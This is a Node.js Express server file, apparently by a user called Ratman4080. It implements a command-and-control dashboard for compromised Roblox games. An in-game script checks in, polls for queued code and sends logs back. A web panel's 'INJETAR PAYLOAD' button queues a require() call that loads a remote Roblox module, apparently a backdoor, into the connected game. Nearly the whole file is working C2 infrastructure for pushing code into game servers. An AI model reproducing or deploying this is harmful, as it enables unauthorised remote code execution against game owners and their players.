// language: JavaScript, target: Node.js (Render), file: server.js
// @author: Ratman4080

const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());
app.use(express.text({ type: 'text/plain' }));

let filaScripts = [];
let robloxConectado = false;
let lastPing = 0;
let serverLogs = [];

function addLog(msg) {
    console.log(msg);
    serverLogs.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
    if (serverLogs.length > 50) serverLogs.shift();
}

// --- ROTAS DO C2 ---

app.post('/roblox/conectar', (req, res) => {
    robloxConectado = true;
    lastPing = Date.now();
    addLog(`[+] Roblox Conectado (IP: ${req.ip})`);
    res.json({ ok: true });
});

app.get('/pegar_script', (req, res) => {
    lastPing = Date.now();
    
    if (filaScripts.length > 0) {
        const script = filaScripts.shift();
        addLog(`[>] Enviando payload da fila: ${script}`);
        res.type('text/plain').send(script); // Força envio como texto puro
    } else {
        res.send(''); 
    }
});

app.post('/inject', (req, res) => {
    if (!robloxConectado || (Date.now() - lastPing > 15000)) {
        return res.status(400).json({ ok: false, erro: "Roblox não está conectado." });
    }

    const payload = 'require(8038037940).CLoad("nottheunidex")';
    filaScripts.push(payload);
    addLog(`[!] Payload enfileirado manualmente pelo Painel.`);
    res.json({ ok: true });
});

// Recebe os logs do script Lua no jogo
app.post('/log', (req, res) => {
    const msg = req.body.msg || req.body;
    if (msg) addLog(`[LUA] ${msg}`);
    res.send('ok');
});

app.get('/status', (req, res) => {
    const isAlive = (Date.now() - lastPing) < 15000;
    res.json({ connected: robloxConectado && isAlive, logs: serverLogs });
});

// --- INTERFACE HTML ---
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>C2 Dashboard</title>
        <style>
            body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .container { background-color: #161b22; padding: 20px; border-radius: 10px; border: 1px solid #30363d; width: 450px; }
            h1 { color: #58a6ff; font-size: 22px; text-align: center; margin-top: 0; }
            .status-box { display: flex; align-items: center; margin-bottom: 15px; font-weight: bold; }
            .indicator { width: 12px; height: 12px; border-radius: 50%; margin-right: 10px; background-color: #f85149; box-shadow: 0 0 10px #f85149; transition: 0.3s; }
            .indicator.online { background-color: #2ea043; box-shadow: 0 0 10px #2ea043; }
            button { background-color: #238636; color: white; border: none; padding: 12px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; }
            button:disabled { background-color: #21262d; color: #8b949e; cursor: not-allowed; border: 1px solid #30363d; }
            .log-box { background-color: #010409; border: 1px solid #30363d; height: 150px; overflow-y: auto; margin-top: 15px; padding: 10px; font-family: monospace; font-size: 11px; color: #7ee787; border-radius: 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>C2 Dashboard</h1>
            <div class="status-box">
                <div id="indicator" class="indicator"></div>
                <span id="status-text">Roblox Offline</span>
            </div>
            <button id="inject-btn" onclick="injetar()" disabled>INJETAR PAYLOAD</button>
            <div id="log-box" class="log-box"></div>
        </div>
        <script>
            const indicator = document.getElementById('indicator');
            const statusText = document.getElementById('status-text');
            const injectBtn = document.getElementById('inject-btn');
            const logBox = document.getElementById('log-box');

            setInterval(async () => {
                try {
                    const res = await fetch('/status');
                    const data = await res.json();
                    
                    if (data.connected) {
                        indicator.classList.add('online');
                        statusText.innerText = 'Roblox Online';
                        injectBtn.disabled = false;
                    } else {
                        indicator.classList.remove('online');
                        statusText.innerText = 'Roblox Offline';
                        injectBtn.disabled = true;
                    }

                    logBox.innerHTML = data.logs.map(l => `<div>> ${l}</div>`).join('');
                    logBox.scrollTop = logBox.scrollHeight;
                } catch (e) {}
            }, 2000);

            async function injetar() {
                injectBtn.disabled = true;
                injectBtn.innerText = "ENVIANDO...";
                try {
                    await fetch('/inject', { method: 'POST' });
                    setTimeout(() => { injectBtn.innerText = "INJETAR PAYLOAD"; }, 2000);
                } catch (e) {
                    setTimeout(() => { injectBtn.innerText = "INJETAR PAYLOAD"; injectBtn.disabled = false; }, 2000);
                }
            }
        </script>
    </body>
    </html>
    `);
});

app.listen(PORT, () => console.log(`[SERVER] Online na porta ${PORT}`));
